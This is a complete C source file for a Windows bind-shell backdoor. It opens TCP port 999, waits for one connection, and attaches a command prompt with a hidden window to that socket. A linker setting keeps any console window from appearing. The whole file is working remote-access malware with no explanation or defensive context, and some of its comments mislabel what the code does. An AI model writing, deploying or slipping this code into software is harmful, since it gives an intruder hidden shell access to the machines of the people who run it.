#pragma comment(lib,"ws2_32.lib")
#pragma comment(llinker,"subsystem:windows/entry:mainCRTStartup")
#include<winsock2.h>
#include<windows.h>
#define MasterPort 999 //define the listening port 999

int main() {

	WSADATA WSADa;
	sockaddr_in SockAddrIn;
	SOCKET CSocket, SSocket;
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCMDPath[255];

	//allocate memory, initialize data
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));

	//get the path of cmd
	GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));

	//load ws2_32.dll
	WSAStartup(0x0202, &WSADa);

	//setting local information and protocol, create socket
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(MasterPort);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//bind the socket with the port 999
	bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));

	//set the server listening port
	listen(CSocket, 1);

	//connect to the remote server
	iAddrSize = sizeof(SockAddrIn);
	SSocket = accept(CSocket, (sockaddr*)&SockAddrIn, &iAddrSize);
	
	//configure the concealed console structure
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;

	//create anonymous pipe
	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);

	//close socket
	closesocket(CSocket);
	closesocket(SSocket);
	
	//unload ws2_32.dll
	WSACleanup();
	
	return 0;

}